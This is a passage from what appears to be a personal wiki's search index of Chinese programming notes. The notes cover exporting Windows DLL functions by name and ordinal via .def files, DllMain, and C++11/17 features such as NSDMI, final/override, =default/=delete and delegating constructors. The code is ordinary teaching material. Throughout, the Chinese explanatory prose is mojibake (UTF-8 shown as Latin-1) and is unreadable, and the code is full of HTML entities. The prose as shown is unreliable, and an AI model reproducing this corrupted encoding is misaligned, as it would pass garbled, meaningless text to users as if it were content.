ä¸ºå‡½æ•°åè¿™ä¸ªä¿¡æ¯å¾ˆå…³é”®ï¼Œå»æ‰å‡½æ•°ååï¼Œé€†å‘åˆ†æäººå‘˜å°±æ²¡æ³•é€šè¿‡å‡½æ•°åæ¥çŒœæµ‹è¿™ä¸ªå‡½æ•°å®ç°çš„åŠŸèƒ½ã€‚ å¯¼å‡ºå‡½æ•°ï¼Œå‡½æ•°åå’Œåºå·è‡³å°‘è¦æœ‰ä¸€ä¸ªï¼Œè¦ä¸åˆ«äººæ²¡æ³•å¼•ç”¨è¿™ä¸ªå‡½æ•°ã€‚ ä½¿ç”¨.defæ–‡ä»¶å¯¼å‡ºå‡½æ•° æ–°å»º.defæ–‡ä»¶ æ·»åŠ åVSä¼šè‡ªåŠ¨æ·»åŠ è¯¥.defæ–‡ä»¶ä¸ºé“¾æ¥å™¨è¾“å…¥ï¼š ç¼–å†™.defæ–‡ä»¶ ArithmeticOperations.h123456#pragma onceint __stdcall Plus(int x, int y);int __stdcall Sub(int x, int y);int __stdcall Mul(int x, int y);int __stdcall Div(int x, int y);Source.def1234567LIBRARYEXPORTS Plus @12\tSub @15 NONAME\tMul @13\tDiv @16 ArithmeticOperations.cpp123456789101112131415161718#include &quot;ArithmeticOperations.h&quot;int __stdcall Plus(int x, int y)&#123;\treturn x + y;&#125;int __stdcall Sub(int x, int y)&#123;\treturn x - y;&#125;int __stdcall Mul(int x, int y)&#123;\treturn x * y;&#125;int __stdcall Div(int x, int y)&#123;\treturn x / y;&#125; ç¬¬ä¸€å¥å¿…é¡»æ˜¯LIBRARYï¼Œåé¢è·Ÿçš„æ˜¯DLLæ–‡ä»¶åã€‚å¦‚æœä¸å¡«ï¼Œé»˜è®¤ä½¿ç”¨DLLçš„æ–‡ä»¶åã€‚ EXPORTSè¯­å¥åï¼š åˆ—å‡ºè¦å¯¼å‡ºçš„å‡½æ•°å @æ•°å­—æŒ‡å®šå¯¼å‡ºåºå·ï¼ˆè™½ç„¶MSDNä¸Šè¯´æ˜¯1~Nï¼ŒNæ˜¯å¯¼å‡ºçš„ä¸ªæ•°ã€‚ä½†å®é™…æ“ä½œä¸‹æ¥å¯ä»¥éšæ„æŒ‡å®šåºå·ï¼Œä¸é‡å¤å³å¯ï¼‰ åŠ ä¸ŠNONAMEï¼Œå¯¼å‡ºæ—¶å°±æ²¡å‡½æ•°åï¼Œåªæœ‰åºå· .defæ–‡ä»¶æ ¼å¼å‚è€ƒï¼šExporting from a DLL Using DEF Files Exporting Functions from a DLL by Ordinal Rather Than by Name ç”¨DependenciesæŸ¥çœ‹ç”¨.defå¯¼å‡ºçš„dll å¯ä»¥çœ‹åˆ°å¯¼å‡ºçš„å‡½æ•°ã€‚ç”±äºåœ¨.defæ–‡ä»¶ä¸­Subå‡½æ•°é‚£è¡ŒåŠ äº†NONAMEï¼Œæ‰€ä»¥Subå‡½æ•°çš„Functioné‚£ä¸€åˆ—å°±æ²¡æœ‰åå­—å¯¼å‡ºï¼Œåªæœ‰åºå·å¯¼å‡º å…¶å®defæ–‡ä»¶çš„åŠŸèƒ½ç›¸å½“äºextern â€œCâ€ __declspec(dllexport)ï¼Œæ— è®ºå‡½æ•°çš„è°ƒç”¨çº¦å®šæ˜¯å•¥ï¼Œåœ¨.defå†™ä¸Šå‡½æ•°åã€‚ç”Ÿæˆçš„dllä¸­å¯¼å‡ºå‡½æ•°åå­—ä¸€æ ·çš„ ä½¿ç”¨åªæœ‰åºå·å¯¼å‡ºçš„å¯¼å‡ºå‡½æ•° ç”¨å¯¼å‡ºåºå·è·å–å‡½æ•°åœ°å€ 12345678910111213141516171819202122232425262728293031323334#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main()&#123;\t//1ã€åŠ¨æ€åŠ è½½dllåˆ°å†…å­˜ä¸­ HMODULE hModule = LoadLibrary(TEXT(&quot;MyTestDll.dll&quot;));\tif (hModule == NULL)\t&#123; printf(&quot;[!] Failed to load MyTestDll.dll &quot;); return 0;\t&#125;\t//2ã€å®šä¹‰å‡½æ•°æŒ‡é’ˆ\tusing fpSub = int(__stdcall*)(int, int);\t//3ã€å£°æ˜å‡½æ•°æŒ‡é’ˆå˜é‡ï¼Œæ¥æ”¶è·å–çš„å‡½æ•°åœ°å€ fpSub mySub = (fpSub)GetProcAddress(hModule, (LPCSTR)15);\tif (mySub == NULL)\t&#123; printf(&quot;[!] Failed to get the address of Sub &quot;); FreeLibrary(hModule); return 0;\t&#125;\t//4ã€è°ƒç”¨å‡½æ•° int b = mySub(10, 2);\tprintf(&quot;%d &quot;, b);\t//5ã€å‡å°‘dllå¼•ç”¨è®¡æ•°\tFreeLibrary(hModule);\treturn 0;&#125; å‚è€ƒï¼šC/C++ å¯¼å‡º DLL å‡½æ•°çš„ä¸€èˆ¬æ–¹æ³• DllMainå‡½æ•° Dllæ–‡ä»¶ä¸­çš„å…¥å£å‡½æ•°æ˜¯DllMainï¼Œå½“ç³»ç»Ÿå¯åŠ¨æˆ–ç»“æŸä¸€ä¸ªè¿›ç¨‹å’Œçº¿ç¨‹æ—¶ï¼Œdllmainå‡½æ•°å°±ä¼šè¢«è°ƒç”¨ã€‚ 12345BOOL WINAPI DllMain( _In_ HINSTANCE hinstDLL, // handle to the DLL module DllåŠ è½½åˆ°è¿›ç¨‹ç©ºé—´ä¸­çš„åŸºå€ _In_ DWORD fdwReason, // reason for calling function è¯¥dllè¢«è°ƒç”¨çš„åŸå›  _In_ LPVOID lpvReserved // reserved); DLL_PROCESS_ATTACHï¼š dllè¢«åŠ è½½æ—¶ä¼šè¢«è°ƒç”¨ ä»£ç ä¸­ä¸»åŠ¨è°ƒç”¨LoadLibraryåŠ è½½è¿™ä¸ªdllæ—¶ä¼šè¢«è°ƒç”¨ï¼ˆç¬¬ä¸€æ¬¡ä¼šï¼Œç¬¬äºŒæ¬¡ä¸ä¼šï¼‰ DLL_PROCESS_DETACHï¼š dllè¢«é”€æ¯æ—¶ä¼šè¢«è°ƒç”¨ ä»£ç æ˜¾å¼å¸è½½FreeLibraryæ—¶ä¼šè¢«è°ƒç”¨ 123456789101112131415161718192021222324252627282930313233BOOL WINAPI DllMain( HINSTANCE hinstDLL, // handle to DLL module DWORD fdwReason, // reason for calling function LPVOID lpvReserved ) // reserved&#123; // Perform actions based on the reason for calling. switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH: // Initialize once for each new process. // Return FALSE to fail DLL load. break; case DLL_THREAD_ATTACH: // Do thread-specific initialization. break; case DLL_THREAD_DETACH: // Do thread-specific cleanup. break; case DLL_PROCESS_DETACH: if (lpvReserved != nullptr) &#123; break; // do not do cleanup if process termination scenario &#125; // Perform any necessary cleanup. break; &#125; return TRUE; // Successful DLL_PROCESS_ATTACH.&#125; å‚è€ƒé“¾æ¥ğŸ”— å‚è€ƒé“¾æ¥ğŸ”— å¤‡æ³¨ ä¸”çœ‹ä¸€æ–‡æ¢³ç†VS2019ä¸­dllçš„åˆ›å»ºä½¿ç”¨ æ€»ç»“å¾—æŒºå¥½çš„ extern â€œCâ€ __declspec(dllexport) __declspec(dllimport) å’Œ def å¯¼å‡ºå£°æ˜æ­é…å®çš„å†™æ³•ä¸åŒè°ƒç”¨çº¦å®šå‡½æ•°å¯¼å‡ºååå­—çš„å˜åŒ– dllå¯¼å‡ºå‡½æ•°çš„ä¸¤ç§æ–¹å¼çš„æ¯”è¾ƒ æ‰©å±•é˜…è¯»ä¸åŒçš„å‡½æ•°è°ƒç”¨çº¦å®šå¯¼å‡ºåå‡½æ•°çš„åå­—çš„å˜åŒ–ï¼ˆæœ‰æˆªå›¾ï¼‰æœªæ¥å¯èƒ½ä¼šç”¨åˆ° ç”¨å…³é”®è¯å¯¼å‡ºè¿˜æ˜¯ç”¨.defå¯¼å‡ºï¼š Determine Which Exporting Method to Use c++åˆ›å»ºdllå¯¼å‡ºå‡½æ•°åç§° æœªæ¥å¯èƒ½ç”¨åˆ°çš„ï¼Œå¯¼å‡ºC++é‡è½½å‡½æ•°æ€ä¹ˆå¼„ï¼š C++ DLL defæ–‡ä»¶ä¸­çš„é‡è½½å‡½æ•°"},{"title":"Lamdbaè¡¨è¾¾å¼","path":"/wiki/Modern_C++/Lamdbaè¡¨è¾¾å¼.html","content":"Lambdaè¡¨è¾¾å¼å°±æ˜¯åŒ¿åç±»+é‡è½½è¿ç®—ç¬¦() auto å˜é‡=lambdaè¡¨è¾¾å¼å°±æ˜¯å¯¹è±¡å®ä¾‹åŒ–ï¼ˆåªèƒ½å†™autoï¼Œå…·ä½“ç±»å‹æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„éšæœºåï¼Œç¨‹åºå‘˜å†™ä»£ç æ—¶æ²¡æ³•å†™ï¼‰ å¯¹è±¡()å°±æ˜¯è°ƒç”¨é‡è½½è¿ç®—ç¬¦()å‡½æ•° æ•è·åˆ—è¡¨å°±æ˜¯è¿™ä¸ªåŒ¿åç±»ä¸­çš„æˆå‘˜"},{"title":"ç±»","path":"/wiki/Modern_C++/ç±».html","content":"NSDMIï¼ˆnon-static data member initializationï¼‰ å‚è€ƒğŸ”—ï¼š(Non) Static Data Members Initialization, from C11 till C20 C++11ä»¥å‰ï¼Œéé™æ€æˆå‘˜å˜é‡åªèƒ½åœ¨åˆå§‹åŒ–åˆ—è¡¨æˆ–æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–ã€‚ä¸èƒ½åœ¨ä¸€ä¸ªclassçš„declarationï¼ˆå£°æ˜ï¼‰ä¸­ç»™éé™æ€æ•°æ®æˆå‘˜åˆå§‹åŒ–ã€‚ 1234567891011// pre C++11 class:struct SimpleType &#123; int field; std::string name; SimpleType() : field(0), name(&quot;Hello World&quot;) &#123; &#125;&#125; ä½†ä»C++11ä»¥åï¼Œå¯ä»¥è¿™ä¹ˆåšäº†ã€‚ç›´æ¥åœ¨ç±»çš„declarationä¸­ç”¨=æˆ–&#123;&#125;å¯¹éé™æ€æ•°æ®æˆå‘˜åˆå§‹åŒ–ã€‚è¿™ä¸ªåŠŸèƒ½è¢«ç§°ä¸ºnon-static data member initializationï¼Œç®€å†™NSDMIã€‚ 12345678// since C++11:struct SimpleType &#123; int field = 0; // works now! std::string name&#123; &quot;Hello World &quot; &#125; // alternate way with &#123; &#125; SimpleType() &#123; &#125;&#125; ç”šè‡³ä»C++ 17ä»¥åï¼Œå¯ä»¥åœ¨ç±»çš„declarationä¸­å¯¹static data memberè¿›è¡Œåˆå§‹åŒ–ï¼ˆå¤šäºäº†inlineï¼‰ã€‚åœ¨C++ 98å‰å¿…é¡»æ‰¾ä¸ªcppæ–‡ä»¶å†™è¿™ä¸ªstatic data memberçš„definitionï¼Œä½†C++17ä»¥åï¼Œç”¨ä»¥ä¸‹çš„æ ¼å¼ï¼Œå°±ä¸éœ€è¦äº†ï¼Œç¼–è¯‘å™¨ä¼šä¿è¯è¿™ä»¶äº‹ã€‚ 1234567struct OtherType &#123; static const int value = 10; static inline std::string className = &quot;Hello Class&quot;; OtherType() &#123; &#125;&#125; static conståœ¨C++ 11ä»¥å‰æœ¬èº«å°±æ˜¯è¿™æ ·å†™çš„ï¼Œåªèƒ½åœ¨declarationä¸­åˆå§‹åŒ–ï¼Œè¦ä¸æ²¡åœ°æ–¹åˆå§‹åŒ–äº†ã€‚ä¹Ÿè®¸æ˜¯å—è¿™ä¸€ç‚¹çš„å¯å‘ï¼Œæ‰€ä»¥C++ 11ä»¥åå…è®¸åœ¨ç±»çš„declarationä¸­ç”¨=æˆ–{}å¯¹éé™æ€æ•°æ®æˆå‘˜è¿›è¡Œåˆå§‹åŒ– NSDMIå’Œåˆå§‹åŒ–åˆ—è¡¨ å¦‚æœä¸€ä¸ªç±»æˆå‘˜åœ¨æ„é€ å‡½æ•°çš„åˆå§‹åŒ–åˆ—è¡¨ä¸­è¢«æ˜¾å¼åˆå§‹åŒ–ï¼Œå®ƒçš„æˆå‘˜åˆå§‹åŒ–ï¼ˆNSDMIï¼‰ä¸ä¼šè¢«æ‰§è¡Œï¼Œæˆ–è€…å«åˆå§‹åŒ–åˆ—è¡¨ä¼šè¦†ç›–å°±åœ°åˆå§‹åŒ–æ“ä½œã€‚è¯æ˜å¦‚ä¸‹ï¼š è¯æ˜æ–¹å¼ä¸€ï¼šå‡½æ•°æ‰“å°è¾“å‡ºè¯æ˜æ–¹å¼äºŒï¼šç¼–è¯‘å™¨å±‚é¢å®ç°åœ¨SimpleTypeç»“æ„ä½“ä¸­ç”¨NSDMIæ¥åˆå§‹åŒ–éé™æ€æ•°æ®æˆå‘˜aå’Œbã€‚ æ— å‚æ„é€ å‡½æ•°ä¸­æ— åˆå§‹åŒ–åˆ—è¡¨ï¼Œä¸ä¼šè¦†ç›–NSDMI æœ‰å‚æ„é€ å‡½æ•°åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­åˆå§‹åŒ–æˆå‘˜aï¼Œä¼šè¦†ç›–æˆå‘˜açš„NSDMIæ‰§è¡Œ 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;string&gt;#include &lt;iostream&gt;int initA() &#123; std::cout &lt;&lt; &quot;initA() called &quot;; return 1;&#125;std::string initB() &#123; std::cout &lt;&lt; &quot;initB() called &quot;; return &quot;Hello&quot;;&#125;struct SimpleType&#123; int a&#123; initA() &#125;; // NSDMI for &#x27;a&#x27; std::string b&#123; initB() &#125;; // NSDMI for &#x27;b&#x27; SimpleType() &#123; // é»˜è®¤æ„é€ å‡½æ•°ä¸è¦†ç›–NSDMI &#125; SimpleType(int x) : a(x) &#123; // é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨è¦†ç›–&#x27;a&#x27;çš„NSDMI &#125;&#125;;int main()&#123; std::cout &lt;&lt; &quot;Creating SimpleType t0 &quot;; SimpleType t0; // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° std::cout &lt;&lt; &quot;t0.a: &quot; &lt;&lt; t0.a &lt;&lt; &quot;, t0.b: &quot; &lt;&lt; t0.b &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Creating SimpleType t1(10) &quot;; SimpleType t1(10); // è°ƒç”¨é‡è½½æ„é€ å‡½æ•°ï¼Œä¸º&#x27;a&#x27;èµ‹å€¼10ï¼Œè¦†ç›–NSDMI std::cout &lt;&lt; &quot;t1.a: &quot; &lt;&lt; t1.a &lt;&lt; &quot;, t1.b: &quot; &lt;&lt; t1.b &lt;&lt; std::endl; return 0;&#125; è¾“å‡º1234567Creating SimpleType t0initA() calledinitB() calledt0.a: 1, t0.b: HelloCreating SimpleType t1(10)initB() calledt1.a: 10, t1.b: Hello SimpleType t1(10);æ–¹å¼åˆ›å»ºå¯¹è±¡t1æ—¶ï¼ŒinitA()æœªè¢«è°ƒç”¨ã€‚è¯´æ˜å˜é‡açš„NSDMIæœªæ‰§è¡Œã€‚åªæœ‰NSDMIæ—¢æœ‰NSDMIï¼Œåˆæœ‰åˆå§‹åŒ–åˆ—è¡¨çš„åˆå§‹åŒ–12345678910111213class Base&#123;public:\tint m_x = 1;&#125;;int main()&#123;\tBase b;\treturn 0;&#125; åˆå§‹åŒ–åˆ—è¡¨ä¸­å¯¹å˜é‡aæœ‰åˆå§‹åŒ–ï¼Œaçš„NSDMIå°±ä¸ä¼šç”Ÿæˆ 1234567891011121314151617class Base&#123;public:\tint m_x = 1;\tBase() :m_x(2)\t&#123;\t&#125;&#125;;int main()&#123;\tBase b;\treturn 0;&#125; åœ¨ç±»çš„å£°æ˜ä¸­ç›´æ¥å¯¹æ•°æ®æˆå‘˜è¿›è¡Œåˆå§‹åŒ–çš„å¥½å¤„ï¼šæé«˜ä»£ç å¯è¯»æ€§ï¼Œå‡å°‘å†—ä½™ä»£ç ï¼Œæå‡å¯ç»´æŠ¤æ€§ï¼ˆå½“ä¸€ä¸ªç±»ä¸­æˆå‘˜å¤ªå¤šï¼Œæ„é€ å‡½æ•°æœ‰å¾ˆå¤šä¸åŒçš„ç‰ˆæœ¬ï¼Œæ¯ä¸ªæ„é€ å‡½æ•°éƒ½è¦å†™ä¸€éæ•°æ®æˆå‘˜çš„åˆå§‹åŒ–çš„ä»£ç ï¼‰ final/overrideä¿®é¥°ç¬¦ å‚è€ƒğŸ”—ï¼š æ˜¾å¼è™šå‡½æ•°é‡è½½ 1.6 final/override/=default/=deleteè¯­æ³• C++è¯­æ³•è§„å®šï¼Œçˆ¶ç±»ä¸­åŠ äº†virtualå…³é”®å­—çš„æ–¹æ³•å¯ä»¥è¢«å­ç±»é‡å†™ï¼Œå­ç±»é‡å†™è¯¥æ–¹æ³•æ—¶å¯ä»¥åŠ æˆ–ä¸åŠ virtualå…³é”®å­—ã€‚è¿™ç§è§„å®šä¸‹å¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼š å†™ä»£ç æ—¶ï¼š åŸæ„æƒ³åœ¨å­ç±»ä¸­é‡å†™è™šå‡½æ•°ï¼Œç»“æœå‡½æ•°ç­¾åï¼ˆå¯èƒ½æ˜¯å‚æ•°ç±»å‹ï¼Œå‚æ•°ä¸ªæ•°ï¼Œè¿”å›ç±»å‹ï¼‰å†™é”™ï¼Œå¯¼è‡´å†™äº†ä¸€ä¸ªæ™®é€šå‡½æ•° åŸæ„ä¸æƒ³åœ¨å­ç±»ä¸­é‡å†™è™šå‡½æ•°ï¼Œç»“æœå‡½æ•°åå†™é”™ï¼Œå¯¼è‡´äº†è™šå‡½æ•°é‡å†™ çˆ¶ç±»è™šå‡½æ•°Base::foo()å‡½æ•°è¢«åˆ é™¤åï¼ŒåŸæœ¬å­ç±»foo()æ˜¯é‡å†™è™šå‡½æ•°ï¼Œå°±å˜æˆäº†æ™®é€šå‡½æ•° è¯»ä»£ç æ—¶ï¼š æ— è®ºå­ç±»é‡å†™è™šå‡½æ•°æ—¶æ˜¯å¦åŠ äº†virtualå…³é”®å­—ï¼Œéƒ½æ²¡æ³•ç›´è§‚çœ‹å‡ºå®ƒæ˜¯é‡å†™äº†çˆ¶ç±»è™šå‡½æ•°ï¼Œè¿˜æ˜¯ä»è¿™ä¸ªå­ç±»å¼€å§‹çš„è™šå‡½æ•° 123456struct Base &#123; virtual void foo();&#125;;struct SubClass: Base &#123; void foo();&#125;; C++ 11å¼•å…¥äº†overrideå’Œfinalè¿™ä¸¤ä¸ªå…³é”®å­—æ¥é˜²æ­¢ä¸Šè¿°æƒ…å½¢çš„å‘ç”Ÿï¼ŒåŠ äº†å…³é”®å­—ååœ¨ç¼–è¯‘å™¨é˜¶æ®µç¼–è¯‘å™¨ä¼šåšæ£€æŸ¥ã€‚ override å‘Šè¯‰ç¼–è¯‘å™¨ï¼Œä¿ºå†™çš„è¿™ä¸ªå‡½æ•°æ˜¯é‡å†™è™šå‡½æ•°ã€‚ç¼–è¯‘å™¨ä¼šæ£€æŸ¥çˆ¶ç±»æ˜¯å¦å­˜åœ¨ç›¸åº”å‡½æ•°ç­¾åçš„è™šå‡½æ•° 12345678910struct Base &#123; virtual void foo(int);&#125;;struct SubClass : Base &#123; virtual void foo(int) override; // åˆæ³• virtual void foo(float) override; // éæ³•, çˆ¶ç±»æ²¡æœ‰æ­¤è™šå‡½æ•°&#125;; final ä¿®é¥°ä¸€ä¸ªç±»ï¼Œè¿™ä¸ªç±»å°†ä¸å…è®¸è¢«ç»§æ‰¿ã€‚ 123456789class A final // finalå…³é”®å­—è¡¨ç¤ºç±»Aä¸èƒ½è¢«ç»§æ‰¿&#123;&#125;;class B : public A // ç¼–è¯‘é”™è¯¯ï¼Œç±»Aè¢«è¢«å£°æ˜ä¸º finalï¼Œä¸èƒ½ä»ç±»Aæ´¾ç”Ÿå‡ºç±»B&#123;&#125;; 1234567891011121314struct Base &#123;&#125;;struct SubClass1 final : Base //ç»§æ‰¿æ—¶finalçš„å†™æ³•&#123;&#125;;struct SubClass2 : SubClass1 // éæ³•, SubClass1 å·² final&#123;&#125;; ä¿®é¥°è™šå‡½æ•°ï¼Œè¿™ä¸ªè™šå‡½æ•°ä¸å…è®¸è¢«å­ç±»é‡å†™ã€‚ 123456789struct Base&#123; virtual void foo() final;&#125;;struct SubClass : Base&#123; void foo(); // éæ³•, foo å·² final&#125;; æ˜¾ç¤ºé»˜è®¤å’Œæ˜¾ç¤ºç¦ç”¨ å‚è€ƒğŸ”—ï¼š 1.6 final/override/=default/=deleteè¯­æ³• æ˜¾å¼ç¦ç”¨é»˜è®¤å‡½æ•° ä¸€ä¸ªC++ç±»æ²¡æœ‰æ˜¾å¼åœ°ç»™å‡ºæ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€æ‹·è´æ„é€ å‡½æ•°ã€operator =è¿™å‡ ç±»å‡½æ•°çš„å®ç°ï¼Œåœ¨éœ€è¦å®ƒä»¬æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ç”Ÿæˆã€‚ é—®é¢˜ï¼š ä»¥æ„é€ å‡½æ•°ä¸ºä¾‹ï¼Œç¼–è¯‘å™¨é»˜è®¤ä¼šç”Ÿæˆæ— å‚æ„é€ å‡½æ•°ã€‚ä½†å½“æˆ‘ä»¬å†™äº†ä¸€ä¸ªæœ‰å‚æ„é€ å‡½æ•°åï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šä¸ºæˆ‘ä»¬ç”Ÿæˆæ— å‚æ„é€ å‡½æ•°ã€‚å¦‚æœæˆ‘ä»¬æƒ³ä½¿ç”¨æ— å‚çš„ï¼Œå°±è¿˜å¾—è‡ªå·±å†™âœã€‚ ç¦æ­¢ç±»çš„æ‹·è´ï¼Œéœ€è¦å°†æ‹·è´æ„é€ å‡½æ•°ã€operator =å£°æ˜ä¸ºï¼šprivateã€‚ é’ˆå¯¹é—®é¢˜1ï¼Œ=defaultå…³é”®å­—ï¼Œè®©ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤çš„ã€‚ é’ˆå¯¹é—®é¢˜2ï¼Œ=deleteå…³é”®å­—ï¼Œä¸è®©ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤çš„ 123456789class Magic &#123;public: Magic() = default; // æ˜¾å¼å£°æ˜ä½¿ç”¨ç¼–è¯‘å™¨ç”Ÿæˆçš„æ„é€  Magic(int magic_number); Magic&amp; operator=(const Magic&amp;) = delete; // æ˜¾å¼å£°æ˜æ‹’ç»ç¼–è¯‘å™¨ç”Ÿæˆæ„é€ &#125; =defaultç”¨é€”åœºæ™¯ ç®€åŒ–.hå’Œ.cppæ–‡ä»¶ä»£ç ç¼–å†™ å¯¹äºç±»Aï¼Œå…¶å¤´æ–‡ä»¶ä¸ºa.h ï¼Œå…¶å®ç°æ–‡ä»¶ä¸ºa.cppï¼Œæ­£å¸¸æƒ…å†µä¸‹éœ€è¦åœ¨a.cppæ–‡ä»¶ä¸­å†™å…¶æ„é€ å‡½æ•°å’Œææ„å‡½æ•°çš„å®ç°ï¼ˆå¯èƒ½æ²¡æœ‰å®é™…æ„é€ å’Œææ„ä»£ç ï¼‰ a.h1234567//a.hclass A&#123;public: A(); ~A();&#125;; a.cpp12345678910//a.cpp#include &quot;a.h&quot;A::A()&#123;&#125;A::~A()&#123;&#125; æœ‰äº†=defaultå…³é”®å­— a.h123456class A&#123;public: A() = default; ~A() = default;&#125;; a.cpp12#include &quot;a.h&quot;//è¿™é‡Œä¸ç”¨åœ¨å†™Açš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°çš„å®ç°äº† =deleteç”¨é€”åœºæ™¯ ä¸å…è®¸ä¸€ä¸ªç±»è¢«æ‹·è´ 123456789101112131415161718192021class A&#123;public: A() = default; // ä½¿ç”¨=defaultæ¥ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•° ~A() = default; // ä½¿ç”¨=defaultæ¥ç”Ÿæˆé»˜è®¤ææ„å‡½æ•°public: A(const A&amp; a) = delete; // ä½¿ç”¨=deleteæ¥ç¦ç”¨å¤åˆ¶æ„é€ å‡½æ•°çš„ç”Ÿæˆ A&amp; operator=(const A&amp; a) = delete; // ä½¿ç”¨=deleteæ¥ç¦ç”¨æ‹·è´èµ‹å€¼è¿ç®—ç¬¦çš„ç”Ÿæˆ&#125;;int main()&#123; A a1; // æ­£å¸¸åˆ›å»ºå¯¹è±¡ // A a2(a1); // ç¼–è¯‘é”™è¯¯ï¼šå¤åˆ¶æ„é€ å‡½æ•°è¢«ç¦ç”¨ A a3; // æ­£å¸¸åˆ›å»ºå¯¹è±¡ // a3 = a1; // ç¼–è¯‘é”™è¯¯ï¼šæ‹·è´èµ‹å€¼è¿ç®—ç¬¦è¢«ç¦ç”¨ return 0;&#125; ä½¿ç”¨ä¸€äº›å·¥å…·ç±»æ—¶ï¼Œä¸éœ€è¦ç”¨åˆ°æ„é€ å‡½æ•°ã€ææ„å‡½æ•°ã€æ‹·è´æ„é€ å‡½æ•°ã€operator=è¿™å››ä¸ªå‡½æ•°ï¼Œç”¨=deleteè¯­æ³•ç¦ç”¨ä»£ç ç”Ÿæˆï¼Œä»¥å‡å°ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶çš„ä½“ç§¯ 1234567891011121314151617class EncodeUtil&#123;public: static std::wstring EncodeUtil::AnsiToUnicode(const std::string&amp; strAnsi); static std::string UnicodeToAnsi(const std::wstring&amp; strUnicode); static std::string AnsiToUtf8(const std::string&amp; strAnsi); static std::string Utf8ToAnsi(const std::string&amp; strUtf8); static std::string UnicodeToUtf8(const std::wstring&amp; strUnicode); static std::wstring Utf8ToUnicode(const std::string&amp; strUtf8);private: EncodeUtil() = delete; ~EncodeUtil() = delete; EncodeUtil(const EncodeUtil&amp; rhs) = delete; EncodeUtil&amp; operator=(const EncodeUtil&amp; rhs) = delete;&#125;; å§”æ‰˜æ„é€ ï¼ˆDelegating Constructorsï¼‰ C++11å¼•å…¥ å…è®¸æ„é€ å‡½æ•°åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­è°ƒç”¨å…¶ä»–æ„é€ å‡½æ•°ã€‚ è¯­æ³•è§„åˆ™ åªèƒ½åœ¨initialization listï¼ˆåˆå§‹åŒ–åˆ—è¡¨ï¼‰ä¸­ä½¿ç”¨å§”æ‰˜æ„é€  åœ¨å‡½æ•°bodyè°ƒç”¨çš„è¯å…¶å®å°±æ˜¯å †æ ˆä¸­æ„é€ ä¸€ä¸ªä¸´æ—¶å¯¹è±¡ï¼Œå­ç±»æ„é€ å‡½æ•°åœ¨å‡½æ•°bodyä¸­è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥åªèƒ½æ”¾initialization listä¸­ initialization listä¸­ç”¨äº†å§”æ‰˜æ„é€ å‡½æ•°ï¼Œä¾¿ä¸èƒ½å†åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­åˆå§‹åŒ–å…¶ä»–æˆå‘˜å˜é‡ å§”æ‰˜æ„é€ å¯ä»¥æˆé“¾ï¼šè¢«å§”æ‰˜è€…ç»§ç»­å§”æ‰˜åˆ«çš„æ„é€ å‡½æ•°è¿›è¡Œæ„é€  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;class Base &#123;public: int m_x; int m_y; int m_z; // æ¥å—1ä¸ªå‚æ•°çš„æ„é€ å‡½æ•° Base(int x) &#123; std::cout &lt;&lt; &quot;Base(int) called...&quot; &lt;&lt; std::endl; m_x = x; &#125; // æ¥å—2ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°ï¼Œå§”æ‰˜ç»™æ¥å—1ä¸ªå‚æ•°çš„æ„é€ å‡½æ•° Base(int x, int y) : Base(x) &#123; std::cout &lt;&lt; &quot;Base(int, int) called...&quot; &lt;&lt; std::endl; m_y = y; &#125; // æ¥å—3ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°ï¼Œå§”æ‰˜ç»™æ¥å—2ä¸ªå‚æ•°çš„æ„é€ å‡½æ•° Base(int x, int y, int z) : Base(x, y) &#123; std::cout &lt;&lt; &quot;Base(int, int, int) called...&quot; &lt;&lt; std::endl; m_z = z; &#125; //ç¼–è¯‘é”™è¯¯ //Base(int x, int y) : Base(x), m_z(0) //å› ä¸ºå·²ç»å§”æ‰˜äº† Base(x)ï¼Œä¸èƒ½å†åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­åˆå§‹åŒ– m_z // &#123; // std::cout &lt;&lt; &quot;Base(int, int) with error called...&quot; &lt;&lt; std::endl; // m_y = y; //&#125;&#125;;int main() &#123; Base b(1, 2, 3); std::cout &lt;&lt; &quot;m_x: &quot; &lt;&lt; b.m_x &lt;&lt; std::endl; std::cout &lt;&lt; &quot;m_y: &quot; &lt;&lt; b.m_y &lt;&lt; std::endl; std::cout &lt;&lt; &quot;m_z: &quot; &lt;&lt; b.m_z &lt;&lt; std::endl;&#125; è¾“å‡ºæ˜¾ç¤º123456Base(int) called...Base(int, int) called...Base(int, int, int) called...m_x: 1m_y: 2m_z: 3 å‡½æ•°è°ƒç”¨é“¾ï¼šBase(int, int, int)çš„åˆå§‹åŒ–åˆ—è¡¨-&gt;Base(int, int)çš„åˆå§‹åŒ–åˆ—è¡¨-&gt;Base(int)çš„åˆå§‹åŒ–åˆ—è¡¨-&gt;Base(int)å‡½æ•°ä½“-&gt;Base(int, int)å‡½æ•°ä½“-&gt;Base(int, int, int)å‡½æ•°ä½“ å¼•å…¥åçš„å¥½å¤„ï¼šç®€åŒ–ä»£ç ï¼Œæé«˜å¯è¯»æ€§ï¼Œæé«˜ä»£ç å¯ç»´æŠ¤æ€§ ä¸Šé¢ä»£ç ä¼šæœ‰ä¸ªwarningï¼Œåœ¨mainä¸­Base b2;ï¼Œè°ƒç”¨çš„æ˜¯æ— å‚æ„é€ 